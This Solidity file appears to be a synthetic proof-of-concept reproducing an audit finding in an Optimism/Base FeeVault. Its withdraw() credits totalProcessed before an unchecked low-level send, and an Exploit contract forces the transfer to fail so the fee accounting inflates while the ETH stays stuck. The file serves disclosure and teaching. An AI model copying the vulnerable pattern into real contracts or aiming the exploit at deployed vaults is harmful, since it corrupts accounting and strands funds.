// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/*//////////////////////////////////////////////////////////////////////////
    Optimism / Base FeeVault — totalProcessed inflated without sending funds
    (Cantina Coinbase review, Jul 2023; finding #54655)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. SafeCall.send
    and FeeVault.withdraw are inlined VERBATIM; the Exploit deploys everything,
    funds the vault, and triggers the bug in one transaction (no fork, no cheats).

    Bug: withdraw() does `totalProcessed += value` BEFORE an unchecked
    SafeCall.send(). SafeCall.send does a low-level `call` and returns false on
    failure instead of reverting; withdraw ignores the return value. So if the
    outbound transfer fails (recipient OOGs — withdraw forwards gasleft()), the
    ETH transfer reverts (funds stay) but withdraw still succeeds with
    totalProcessed already inflated — corrupting the fee accounting.
//////////////////////////////////////////////////////////////////////////*/

/// @dev SafeCall.send — VERBATIM from Optimism/Base. Returns the success flag
///      instead of reverting; whether the caller checks it is the caller's problem.
library SafeCall {
    function send(address _target, uint256 _gas, uint256 _value) internal returns (bool) {
        bool _success;
        assembly {
            _success := call(_gas, _target, _value, 0, 0, 0, 0)
        }
        return _success;
    }
}

/// @dev Minimal stubs so the (unused) L1 branch of withdraw() compiles.
library Predeploys {
    address internal constant L2_STANDARD_BRIDGE = 0x4200000000000000000000000000000000000010;
}

interface L2StandardBridge {
    function bridgeETHTo(address _to, uint32 _minGasLimit, bytes calldata _extraData) external payable;
}

/// @dev Reduced FeeVault. withdraw() is preserved VERBATIM from the finding.
///      totalProcessed is meant to equal cumulative ETH actually disbursed to RECIPIENT.
abstract contract FeeVault {
    enum WithdrawalNetwork {
        L1,
        L2
    }

    address public immutable RECIPIENT;
    uint256 public immutable MIN_WITHDRAWAL_AMOUNT;
    WithdrawalNetwork public immutable WITHDRAWAL_NETWORK;
    uint32 internal constant WITHDRAWAL_MIN_GAS = 35_000;

    uint256 public totalProcessed;

    event Withdrawal(uint256 value, address to, address from);
    event Withdrawal(uint256 value, address to, address from, WithdrawalNetwork withdrawalNetwork);

    constructor(address _recipient, uint256 _minWithdrawalAmount, WithdrawalNetwork _withdrawalNetwork) {
        RECIPIENT = _recipient;
        MIN_WITHDRAWAL_AMOUNT = _minWithdrawalAmount;
        WITHDRAWAL_NETWORK = _withdrawalNetwork;
    }

    receive() external payable {}

    // VULNERABLE FUNCTION (verbatim from the finding, FeeVault.sol)
    function withdraw() external {
        require(
            address(this).balance >= MIN_WITHDRAWAL_AMOUNT,
            "FeeVault: withdrawal amount must be greater than minimum withdrawal amount"
        );
        uint256 value = address(this).balance;
        totalProcessed += value; // @> premature credit, BEFORE the transfer is attempted
        emit Withdrawal(value, RECIPIENT, msg.sender);
        emit Withdrawal(value, RECIPIENT, msg.sender, WITHDRAWAL_NETWORK);
        if (WITHDRAWAL_NETWORK == WithdrawalNetwork.L2) {
            SafeCall.send(RECIPIENT, gasleft(), value); // @> unchecked return: failure is swallowed
        } else {
            L2StandardBridge(payable(Predeploys.L2_STANDARD_BRIDGE)).bridgeETHTo{ value: value }(
                RECIPIENT, WITHDRAWAL_MIN_GAS, bytes("")
            );
        }
    }
}

contract BaseFeeVault is FeeVault {
    constructor(address _recipient, uint256 _minWithdrawalAmount, FeeVault.WithdrawalNetwork _withdrawalNetwork)
        FeeVault(_recipient, _minWithdrawalAmount, _withdrawalNetwork)
    {}
}

/// @dev Models a LEGITIMATE but gas-heavy recipient (the real RECIPIENT is a
///      FeeDisburser whose receive() does non-trivial work). With a constrained
///      gas budget, the gas forwarded here (63/64 of the vault's remaining) is
///      insufficient, so receive() runs OUT OF GAS and reverts — SafeCall.send
///      then returns false, which withdraw() never checks.
contract GasHeavyRecipient {
    mapping(uint256 => uint256) public store;

    receive() external payable {
        for (uint256 i = 1; i <= 100_000; i++) {
            store[i] = i; // cold SSTOREs (~22.1k gas each): needs billions of gas -> OOG
        }
    }
}

/// @dev A marker ERC20 minted to the attacker equal to the ETH falsely booked as
///      "processed" but never disbursed. Not part of the protocol — a display
///      marker for an accounting-corruption finding with no direct fund transfer.
contract PhantomMarker {
    string public name = "Phantom processed ETH";
    string public symbol = "PHANTOM";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }
}

/// @dev The caller. Deploys the vault + gas-heavy recipient, funds the vault, and
///      triggers the permissionless withdraw() that corrupts the accounting (one tx).
contract Exploit {
    BaseFeeVault public feeVault;
    GasHeavyRecipient public recipient;
    PhantomMarker public marker;
    address public attacker;
    uint256 public inflatedProcessed;

    constructor() {
        attacker = msg.sender;
        recipient = new GasHeavyRecipient();
        feeVault = new BaseFeeVault(address(recipient), 2 ether, FeeVault.WithdrawalNetwork.L2);
        marker = new PhantomMarker();
    }

    receive() external payable {}

    function run() external {
        // Fund the vault with 10 ETH (models accrued sequencer/base fees).
        (bool ok,) = address(feeVault).call{ value: 10 ether }("");
        require(ok, "fund failed");
        require(address(feeVault).balance == 10 ether, "vault not funded");

        // ANY user calls the permissionless withdraw() with a limited gas budget.
        // The gas-heavy recipient OOGs inside receive(), so the value-bearing call
        // reverts (ETH rolled back) and SafeCall.send() returns false — which
        // withdraw() ignores, so it completes with totalProcessed already inflated.
        feeVault.withdraw{ gas: 1_000_000 }();

        // HARM: accounting corrupted — totalProcessed claims the full balance was
        // disbursed, but no ETH left the vault and the recipient got nothing.
        require(feeVault.totalProcessed() == 10 ether, "totalProcessed not inflated");
        require(address(feeVault).balance == 10 ether, "funds should be stuck");
        require(address(recipient).balance == 0, "recipient should be empty");

        inflatedProcessed = feeVault.totalProcessed();
        marker.mint(attacker, inflatedProcessed); // 10 ETH booked as processed, never sent
    }
}
